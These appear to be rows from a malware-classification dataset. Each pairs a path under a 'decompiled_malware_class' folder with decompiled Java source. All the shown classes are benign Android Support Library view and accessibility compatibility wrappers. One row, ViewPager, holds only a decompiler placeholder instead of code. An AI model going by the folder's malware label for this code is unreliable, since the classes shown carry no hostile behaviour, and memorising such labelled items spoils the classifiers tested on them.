"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewCompatICS.code","class ViewCompatICS {   ViewCompatICS(){   }   public static boolean canScrollHorizontally(  View v,  int direction){     return v.canScrollHorizontally(direction);   }   public static boolean canScrollVertically(  View v,  int direction){     return v.canScrollVertically(direction);   }   public static void setAccessibilityDelegate(  View v,  Object delegate){     v.setAccessibilityDelegate((View.AccessibilityDelegate)delegate);   }   public static void onPopulateAccessibilityEvent(  View v,  AccessibilityEvent event){     v.onPopulateAccessibilityEvent(event);   }   public static void onInitializeAccessibilityEvent(  View v,  AccessibilityEvent event){     v.onInitializeAccessibilityEvent(event);   }   public static void onInitializeAccessibilityNodeInfo(  View v,  Object info){     v.onInitializeAccessibilityNodeInfo((AccessibilityNodeInfo)info);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewCompatImpl.code","interface ViewCompatImpl {   boolean canScrollHorizontally(  View view,  int i);   boolean canScrollVertically(  View view,  int i);   int getAccessibilityLiveRegion(  View view);   AccessibilityNodeProviderCompat getAccessibilityNodeProvider(  View view);   float getAlpha(  View view);   int getImportantForAccessibility(  View view);   int getLabelFor(  View view);   int getLayerType(  View view);   int getLayoutDirection(  View view);   int getMeasuredHeightAndState(  View view);   int getMeasuredState(  View view);   int getMeasuredWidthAndState(  View view);   int getOverScrollMode(  View view);   ViewParent getParentForAccessibility(  View view);   boolean hasTransientState(  View view);   boolean isOpaque(  View view);   void onInitializeAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   void onInitializeAccessibilityNodeInfo(  View view,  AccessibilityNodeInfoCompat accessibilityNodeInfoCompat);   void onPopulateAccessibilityEvent(  View view,  AccessibilityEvent accessibilityEvent);   boolean performAccessibilityAction(  View view,  int i,  Bundle bundle);   void postInvalidateOnAnimation(  View view);   void postInvalidateOnAnimation(  View view,  int i,  int i2,  int i3,  int i4);   void postOnAnimation(  View view,  Runnable runnable);   void postOnAnimationDelayed(  View view,  Runnable runnable,  long j);   int resolveSizeAndState(  int i,  int i2,  int i3);   void setAccessibilityDelegate(  View view,  AccessibilityDelegateCompat accessibilityDelegateCompat);   void setAccessibilityLiveRegion(  View view,  int i);   void setHasTransientState(  View view,  boolean z);   void setImportantForAccessibility(  View view,  int i);   void setLabelFor(  View view,  int i);   void setLayerPaint(  View view,  Paint paint);   void setLayerType(  View view,  int i,  Paint paint);   void setLayoutDirection(  View view,  int i);   void setOverScrollMode(  View view,  int i); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewCompatJB.code","class ViewCompatJB {   ViewCompatJB(){   }   public static boolean hasTransientState(  View view){     return view.hasTransientState();   }   public static void setHasTransientState(  View view,  boolean hasTransientState){     view.setHasTransientState(hasTransientState);   }   public static void postInvalidateOnAnimation(  View view){     view.postInvalidateOnAnimation();   }   public static void postInvalidateOnAnimation(  View view,  int left,  int top,  int right,  int bottom){     view.postInvalidate(left,top,right,bottom);   }   public static void postOnAnimation(  View view,  Runnable action){     view.postOnAnimation(action);   }   public static void postOnAnimationDelayed(  View view,  Runnable action,  long delayMillis){     view.postOnAnimationDelayed(action,delayMillis);   }   public static int getImportantForAccessibility(  View view){     return view.getImportantForAccessibility();   }   public static void setImportantForAccessibility(  View view,  int mode){     view.setImportantForAccessibility(mode);   }   public static boolean performAccessibilityAction(  View view,  int action,  Bundle arguments){     return view.performAccessibilityAction(action,arguments);   }   public static Object getAccessibilityNodeProvider(  View view){     return view.getAccessibilityNodeProvider();   }   public static ViewParent getParentForAccessibility(  View view){     return view.getParentForAccessibility();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewCompatJellybeanMr1.code","class ViewCompatJellybeanMr1 {   ViewCompatJellybeanMr1(){   }   public static int getLabelFor(  View view){     return view.getLabelFor();   }   public static void setLabelFor(  View view,  int id){     view.setLabelFor(id);   }   public static void setLayerPaint(  View view,  Paint paint){     view.setLayerPaint(paint);   }   public static int getLayoutDirection(  View view){     return view.getLayoutDirection();   }   public static void setLayoutDirection(  View view,  int layoutDirection){     view.setLayoutDirection(layoutDirection);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewCompatKitKat.code","public class ViewCompatKitKat {   public static int getAccessibilityLiveRegion(  View view){     return view.getAccessibilityLiveRegion();   }   public static void setAccessibilityLiveRegion(  View view,  int mode){     view.setAccessibilityLiveRegion(mode);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewConfigurationCompat.code","public class ViewConfigurationCompat {   static final ViewConfigurationVersionImpl IMPL; interface ViewConfigurationVersionImpl {     int getScaledPagingTouchSlop(    ViewConfiguration viewConfiguration);   } static class BaseViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     BaseViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration config){       return config.getScaledTouchSlop();     }   } static class FroyoViewConfigurationVersionImpl implements ViewConfigurationVersionImpl {     FroyoViewConfigurationVersionImpl(){     }     @Override public int getScaledPagingTouchSlop(    ViewConfiguration config){       return ViewConfigurationCompatFroyo.getScaledPagingTouchSlop(config);     }   } static {     if (Build.VERSION.SDK_INT >= 11) {       IMPL=new FroyoViewConfigurationVersionImpl();     }  else {       IMPL=new BaseViewConfigurationVersionImpl();     }   }   public static int getScaledPagingTouchSlop(  ViewConfiguration config){     return IMPL.getScaledPagingTouchSlop(config);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewConfigurationCompatFroyo.code","class ViewConfigurationCompatFroyo {   ViewConfigurationCompatFroyo(){   }   public static int getScaledPagingTouchSlop(  ViewConfiguration config){     return config.getScaledPagingTouchSlop();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewConfigurationVersionImpl.code","interface ViewConfigurationVersionImpl {   int getScaledPagingTouchSlop(  ViewConfiguration viewConfiguration); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewGroupCompat.code","public class ViewGroupCompat {   static final ViewGroupCompatImpl IMPL;   public static final int LAYOUT_MODE_CLIP_BOUNDS=0;   public static final int LAYOUT_MODE_OPTICAL_BOUNDS=1; interface ViewGroupCompatImpl {     int getLayoutMode(    ViewGroup viewGroup);     boolean onRequestSendAccessibilityEvent(    ViewGroup viewGroup,    View view,    AccessibilityEvent accessibilityEvent);     void setLayoutMode(    ViewGroup viewGroup,    int i);     void setMotionEventSplittingEnabled(    ViewGroup viewGroup,    boolean z);   } static class ViewGroupCompatStubImpl implements ViewGroupCompatImpl {     ViewGroupCompatStubImpl(){     }     @Override public boolean onRequestSendAccessibilityEvent(    ViewGroup group,    View child,    AccessibilityEvent event){       return true;     }     @Override public void setMotionEventSplittingEnabled(    ViewGroup group,    boolean split){     }     @Override public int getLayoutMode(    ViewGroup group){       return 0;     }     @Override public void setLayoutMode(    ViewGroup group,    int mode){     }   } static class ViewGroupCompatHCImpl extends ViewGroupCompatStubImpl {     ViewGroupCompatHCImpl(){     }     @Override public void setMotionEventSplittingEnabled(    ViewGroup group,    boolean split){       ViewGroupCompatHC.setMotionEventSplittingEnabled(group,split);     }   } static class ViewGroupCompatIcsImpl extends ViewGroupCompatHCImpl {     ViewGroupCompatIcsImpl(){     }     @Override public boolean onRequestSendAccessibilityEvent(    ViewGroup group,    View child,    AccessibilityEvent event){       return ViewGroupCompatIcs.onRequestSendAccessibilityEvent(group,child,event);     }   } static class ViewGroupCompatJellybeanMR2Impl extends ViewGroupCompatIcsImpl {     ViewGroupCompatJellybeanMR2Impl(){     }     @Override public int getLayoutMode(    ViewGroup group){       return ViewGroupCompatJellybeanMR2.getLayoutMode(group);     }     @Override public void setLayoutMode(    ViewGroup group,    int mode){       ViewGroupCompatJellybeanMR2.setLayoutMode(group,mode);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 18) {       IMPL=new ViewGroupCompatJellybeanMR2Impl();       return;     }     if (version >= 14) {       IMPL=new ViewGroupCompatIcsImpl();     }  else     if (version >= 11) {       IMPL=new ViewGroupCompatHCImpl();     }  else {       IMPL=new ViewGroupCompatStubImpl();     }   }   private ViewGroupCompat(){   }   public static boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return IMPL.onRequestSendAccessibilityEvent(group,child,event);   }   public static void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){     IMPL.setMotionEventSplittingEnabled(group,split);   }   public static int getLayoutMode(  ViewGroup group){     return IMPL.getLayoutMode(group);   }   public static void setLayoutMode(  ViewGroup group,  int mode){     IMPL.setLayoutMode(group,mode);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewGroupCompatHC.code","class ViewGroupCompatHC {   private ViewGroupCompatHC(){   }   public static void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){     group.setMotionEventSplittingEnabled(split);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewGroupCompatHCImpl.code","static class ViewGroupCompatHCImpl extends ViewGroupCompatStubImpl {   ViewGroupCompatHCImpl(){   }   @Override public void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){     ViewGroupCompatHC.setMotionEventSplittingEnabled(group,split);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewGroupCompatIcs.code","class ViewGroupCompatIcs {   ViewGroupCompatIcs(){   }   public static boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return group.onRequestSendAccessibilityEvent(child,event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewGroupCompatIcsImpl.code","static class ViewGroupCompatIcsImpl extends ViewGroupCompatHCImpl {   ViewGroupCompatIcsImpl(){   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return ViewGroupCompatIcs.onRequestSendAccessibilityEvent(group,child,event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewGroupCompatImpl.code","interface ViewGroupCompatImpl {   int getLayoutMode(  ViewGroup viewGroup);   boolean onRequestSendAccessibilityEvent(  ViewGroup viewGroup,  View view,  AccessibilityEvent accessibilityEvent);   void setLayoutMode(  ViewGroup viewGroup,  int i);   void setMotionEventSplittingEnabled(  ViewGroup viewGroup,  boolean z); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewGroupCompatJellybeanMR2.code","class ViewGroupCompatJellybeanMR2 {   ViewGroupCompatJellybeanMR2(){   }   public static int getLayoutMode(  ViewGroup group){     return group.getLayoutMode();   }   public static void setLayoutMode(  ViewGroup group,  int mode){     group.setLayoutMode(mode);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewGroupCompatJellybeanMR2Impl.code","static class ViewGroupCompatJellybeanMR2Impl extends ViewGroupCompatIcsImpl {   ViewGroupCompatJellybeanMR2Impl(){   }   @Override public int getLayoutMode(  ViewGroup group){     return ViewGroupCompatJellybeanMR2.getLayoutMode(group);   }   @Override public void setLayoutMode(  ViewGroup group,  int mode){     ViewGroupCompatJellybeanMR2.setLayoutMode(group,mode);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewGroupCompatStubImpl.code","static class ViewGroupCompatStubImpl implements ViewGroupCompatImpl {   ViewGroupCompatStubImpl(){   }   @Override public boolean onRequestSendAccessibilityEvent(  ViewGroup group,  View child,  AccessibilityEvent event){     return true;   }   @Override public void setMotionEventSplittingEnabled(  ViewGroup group,  boolean split){   }   @Override public int getLayoutMode(  ViewGroup group){     return 0;   }   @Override public void setLayoutMode(  ViewGroup group,  int mode){   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewPager.code","!org.eclipse.jdt.core.dom.TypeDeclaration@44ba5e39"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewParentCompat.code","public class ViewParentCompat {   static final ViewParentCompatImpl IMPL; interface ViewParentCompatImpl {     boolean requestSendAccessibilityEvent(    ViewParent viewParent,    View view,    AccessibilityEvent accessibilityEvent);   } static class ViewParentCompatStubImpl implements ViewParentCompatImpl {     ViewParentCompatStubImpl(){     }     @Override public boolean requestSendAccessibilityEvent(    ViewParent parent,    View child,    AccessibilityEvent event){       if (child == null) {         return false;       }       AccessibilityManager manager=(AccessibilityManager)child.getContext().getSystemService(""accessibility"");       manager.sendAccessibilityEvent(event);       return true;     }   } static class ViewParentCompatICSImpl extends ViewParentCompatStubImpl {     ViewParentCompatICSImpl(){     }     @Override public boolean requestSendAccessibilityEvent(    ViewParent parent,    View child,    AccessibilityEvent event){       return ViewParentCompatICS.requestSendAccessibilityEvent(parent,child,event);     }   } static {     int version=Build.VERSION.SDK_INT;     if (version >= 14) {       IMPL=new ViewParentCompatICSImpl();     }  else {       IMPL=new ViewParentCompatStubImpl();     }   }   private ViewParentCompat(){   }   public static boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     return IMPL.requestSendAccessibilityEvent(parent,child,event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewParentCompatICS.code","public class ViewParentCompatICS {   public static boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     return parent.requestSendAccessibilityEvent(child,event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewParentCompatICSImpl.code","static class ViewParentCompatICSImpl extends ViewParentCompatStubImpl {   ViewParentCompatICSImpl(){   }   @Override public boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     return ViewParentCompatICS.requestSendAccessibilityEvent(parent,child,event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewParentCompatImpl.code","interface ViewParentCompatImpl {   boolean requestSendAccessibilityEvent(  ViewParent viewParent,  View view,  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewParentCompatStubImpl.code","static class ViewParentCompatStubImpl implements ViewParentCompatImpl {   ViewParentCompatStubImpl(){   }   @Override public boolean requestSendAccessibilityEvent(  ViewParent parent,  View child,  AccessibilityEvent event){     if (child == null) {       return false;     }     AccessibilityManager manager=(AccessibilityManager)child.getContext().getSystemService(""accessibility"");     manager.sendAccessibilityEvent(event);     return true;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\ViewPositionComparator.code","public static class ViewPositionComparator implements Comparator<View> {   ViewPositionComparator(){   }   @Override public int compare(  View lhs,  View rhs){     LayoutParams llp=(LayoutParams)lhs.getLayoutParams();     LayoutParams rlp=(LayoutParams)rhs.getLayoutParams();     if (llp.isDecor != rlp.isDecor) {       return llp.isDecor ? 1 : -1;     }     return llp.position - rlp.position;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\VisibilityListener.code","public interface VisibilityListener {   void onActionProviderVisibilityChanged(  boolean z); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view\WindowCompat.code","public class WindowCompat {   public static final int FEATURE_ACTION_BAR=8;   public static final int FEATURE_ACTION_BAR_OVERLAY=9;   public static final int FEATURE_ACTION_MODE_OVERLAY=10; } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityEventCompat.code","public class AccessibilityEventCompat {   private static final AccessibilityEventVersionImpl IMPL;   public static final int TYPES_ALL_MASK=-1;   public static final int TYPE_ANNOUNCEMENT=16384;   public static final int TYPE_GESTURE_DETECTION_END=524288;   public static final int TYPE_GESTURE_DETECTION_START=262144;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_END=1024;   public static final int TYPE_TOUCH_EXPLORATION_GESTURE_START=512;   public static final int TYPE_TOUCH_INTERACTION_END=2097152;   public static final int TYPE_TOUCH_INTERACTION_START=1048576;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUSED=32768;   public static final int TYPE_VIEW_ACCESSIBILITY_FOCUS_CLEARED=65536;   public static final int TYPE_VIEW_HOVER_ENTER=128;   public static final int TYPE_VIEW_HOVER_EXIT=256;   public static final int TYPE_VIEW_SCROLLED=4096;   public static final int TYPE_VIEW_TEXT_SELECTION_CHANGED=8192;   public static final int TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY=131072;   public static final int TYPE_WINDOW_CONTENT_CHANGED=2048; interface AccessibilityEventVersionImpl {     void appendRecord(    AccessibilityEvent accessibilityEvent,    Object obj);     Object getRecord(    AccessibilityEvent accessibilityEvent,    int i);     int getRecordCount(    AccessibilityEvent accessibilityEvent);   } static class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {     AccessibilityEventStubImpl(){     }     @Override public void appendRecord(    AccessibilityEvent event,    Object record){     }     @Override public Object getRecord(    AccessibilityEvent event,    int index){       return null;     }     @Override public int getRecordCount(    AccessibilityEvent event){       return 0;     }   } static class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {     AccessibilityEventIcsImpl(){     }     @Override public void appendRecord(    AccessibilityEvent event,    Object record){       AccessibilityEventCompatIcs.appendRecord(event,record);     }     @Override public Object getRecord(    AccessibilityEvent event,    int index){       return AccessibilityEventCompatIcs.getRecord(event,index);     }     @Override public int getRecordCount(    AccessibilityEvent event){       return AccessibilityEventCompatIcs.getRecordCount(event);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityEventIcsImpl();     }  else {       IMPL=new AccessibilityEventStubImpl();     }   }   private AccessibilityEventCompat(){   }   public static int getRecordCount(  AccessibilityEvent event){     return IMPL.getRecordCount(event);   }   public static void appendRecord(  AccessibilityEvent event,  AccessibilityRecordCompat record){     IMPL.appendRecord(event,record.getImpl());   }   public static AccessibilityRecordCompat getRecord(  AccessibilityEvent event,  int index){     return new AccessibilityRecordCompat(IMPL.getRecord(event,index));   }   public static AccessibilityRecordCompat asRecord(  AccessibilityEvent event){     return new AccessibilityRecordCompat(event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityEventCompatIcs.code","class AccessibilityEventCompatIcs {   AccessibilityEventCompatIcs(){   }   public static int getRecordCount(  AccessibilityEvent event){     return event.getRecordCount();   }   public static void appendRecord(  AccessibilityEvent event,  Object record){     event.appendRecord((AccessibilityRecord)record);   }   public static Object getRecord(  AccessibilityEvent event,  int index){     return event.getRecord(index);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityEventIcsImpl.code","static class AccessibilityEventIcsImpl extends AccessibilityEventStubImpl {   AccessibilityEventIcsImpl(){   }   @Override public void appendRecord(  AccessibilityEvent event,  Object record){     AccessibilityEventCompatIcs.appendRecord(event,record);   }   @Override public Object getRecord(  AccessibilityEvent event,  int index){     return AccessibilityEventCompatIcs.getRecord(event,index);   }   @Override public int getRecordCount(  AccessibilityEvent event){     return AccessibilityEventCompatIcs.getRecordCount(event);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityEventStubImpl.code","static class AccessibilityEventStubImpl implements AccessibilityEventVersionImpl {   AccessibilityEventStubImpl(){   }   @Override public void appendRecord(  AccessibilityEvent event,  Object record){   }   @Override public Object getRecord(  AccessibilityEvent event,  int index){     return null;   }   @Override public int getRecordCount(  AccessibilityEvent event){     return 0;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityEventVersionImpl.code","interface AccessibilityEventVersionImpl {   void appendRecord(  AccessibilityEvent accessibilityEvent,  Object obj);   Object getRecord(  AccessibilityEvent accessibilityEvent,  int i);   int getRecordCount(  AccessibilityEvent accessibilityEvent); } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityManagerCompat.code","public class AccessibilityManagerCompat {   private static final AccessibilityManagerVersionImpl IMPL; interface AccessibilityManagerVersionImpl {     boolean addAccessibilityStateChangeListener(    AccessibilityManager accessibilityManager,    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);     List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager accessibilityManager,    int i);     List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager accessibilityManager);     boolean isTouchExplorationEnabled(    AccessibilityManager accessibilityManager);     Object newAccessiblityStateChangeListener(    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);     boolean removeAccessibilityStateChangeListener(    AccessibilityManager accessibilityManager,    AccessibilityStateChangeListenerCompat accessibilityStateChangeListenerCompat);   } public static abstract class AccessibilityStateChangeListenerCompat {     final Object mListener=AccessibilityManagerCompat.IMPL.newAccessiblityStateChangeListener(this);     public abstract void onAccessibilityStateChanged(    boolean z);   } static class AccessibilityManagerStubImpl implements AccessibilityManagerVersionImpl {     AccessibilityManagerStubImpl(){     }     @Override public Object newAccessiblityStateChangeListener(    AccessibilityStateChangeListenerCompat listener){       return null;     }     @Override public boolean addAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return false;     }     @Override public boolean removeAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return false;     }     @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager manager,    int feedbackTypeFlags){       return Collections.emptyList();     }     @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager manager){       return Collections.emptyList();     }     @Override public boolean isTouchExplorationEnabled(    AccessibilityManager manager){       return false;     }   } static class AccessibilityManagerIcsImpl extends AccessibilityManagerStubImpl {     AccessibilityManagerIcsImpl(){     }     @Override public Object newAccessiblityStateChangeListener(    final AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.newAccessibilityStateChangeListener(new AccessibilityManagerCompatIcs.AccessibilityStateChangeListenerBridge(){         @Override public void onAccessibilityStateChanged(        boolean enabled){           listener.onAccessibilityStateChanged(enabled);         }       } );     }     @Override public boolean addAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.addAccessibilityStateChangeListener(manager,listener.mListener);     }     @Override public boolean removeAccessibilityStateChangeListener(    AccessibilityManager manager,    AccessibilityStateChangeListenerCompat listener){       return AccessibilityManagerCompatIcs.removeAccessibilityStateChangeListener(manager,listener.mListener);     }     @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(    AccessibilityManager manager,    int feedbackTypeFlags){       return AccessibilityManagerCompatIcs.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);     }     @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(    AccessibilityManager manager){       return AccessibilityManagerCompatIcs.getInstalledAccessibilityServiceList(manager);     }     @Override public boolean isTouchExplorationEnabled(    AccessibilityManager manager){       return AccessibilityManagerCompatIcs.isTouchExplorationEnabled(manager);     }   } static {     if (Build.VERSION.SDK_INT >= 14) {       IMPL=new AccessibilityManagerIcsImpl();     }  else {       IMPL=new AccessibilityManagerStubImpl();     }   }   public static boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return IMPL.addAccessibilityStateChangeListener(manager,listener);   }   public static boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return IMPL.removeAccessibilityStateChangeListener(manager,listener);   }   public static List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return IMPL.getInstalledAccessibilityServiceList(manager);   }   public static List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return IMPL.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);   }   public static boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return IMPL.isTouchExplorationEnabled(manager);   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityManagerCompatIcs.code","class AccessibilityManagerCompatIcs { interface AccessibilityStateChangeListenerBridge {     void onAccessibilityStateChanged(    boolean z);   }   AccessibilityManagerCompatIcs(){   }   public static Object newAccessibilityStateChangeListener(  final AccessibilityStateChangeListenerBridge bridge){     return new AccessibilityManager.AccessibilityStateChangeListener(){       @Override public void onAccessibilityStateChanged(      boolean enabled){         AccessibilityStateChangeListenerBridge.this.onAccessibilityStateChanged(enabled);       }     } ;   }   public static boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  Object listener){     return manager.addAccessibilityStateChangeListener((AccessibilityManager.AccessibilityStateChangeListener)listener);   }   public static boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  Object listener){     return manager.removeAccessibilityStateChangeListener((AccessibilityManager.AccessibilityStateChangeListener)listener);   }   public static List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return manager.getEnabledAccessibilityServiceList(feedbackTypeFlags);   }   public static List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return manager.getInstalledAccessibilityServiceList();   }   public static boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return manager.isTouchExplorationEnabled();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\android.support.v4.view.accessibility\AccessibilityManagerIcsImpl.code","static class AccessibilityManagerIcsImpl extends AccessibilityManagerStubImpl {   AccessibilityManagerIcsImpl(){   }   @Override public Object newAccessiblityStateChangeListener(  final AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.newAccessibilityStateChangeListener(new AccessibilityManagerCompatIcs.AccessibilityStateChangeListenerBridge(){       @Override public void onAccessibilityStateChanged(      boolean enabled){         listener.onAccessibilityStateChanged(enabled);       }     } );   }   @Override public boolean addAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.addAccessibilityStateChangeListener(manager,listener.mListener);   }   @Override public boolean removeAccessibilityStateChangeListener(  AccessibilityManager manager,  AccessibilityStateChangeListenerCompat listener){     return AccessibilityManagerCompatIcs.removeAccessibilityStateChangeListener(manager,listener.mListener);   }   @Override public List<AccessibilityServiceInfo> getEnabledAccessibilityServiceList(  AccessibilityManager manager,  int feedbackTypeFlags){     return AccessibilityManagerCompatIcs.getEnabledAccessibilityServiceList(manager,feedbackTypeFlags);   }   @Override public List<AccessibilityServiceInfo> getInstalledAccessibilityServiceList(  AccessibilityManager manager){     return AccessibilityManagerCompatIcs.getInstalledAccessibilityServiceList(manager);   }   @Override public boolean isTouchExplorationEnabled(  AccessibilityManager manager){     return AccessibilityManagerCompatIcs.isTouchExplorationEnabled(manager);   } } "
